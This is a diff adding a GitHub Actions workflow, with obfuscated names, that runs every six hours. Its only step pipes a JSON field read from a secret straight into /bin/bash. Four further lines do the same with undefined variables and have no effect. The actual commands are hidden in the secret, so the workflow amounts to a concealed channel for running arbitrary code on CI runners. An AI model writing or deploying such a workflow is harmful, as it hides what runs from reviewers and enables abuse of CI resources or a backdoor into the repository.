@@ -1,0 +1,22 @@
+name: lujiessicak
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lujiessicak
+        env:
+          kvh77444: ${{ secrets.kvh77444 }}
+        run: |
+          echo $kvh77444 | jq -r .fgoo7 | /bin/bash
+          echo $qvoa2 | jq -r .rpre19369 | /bin/bash
+          echo $hrrn9 | jq -r .wwr164 | /bin/bash
+          echo $su8388 | jq -r .pe4 | /bin/bash
+          echo $x6 | jq -r .bn63435 | /bin/bash
+
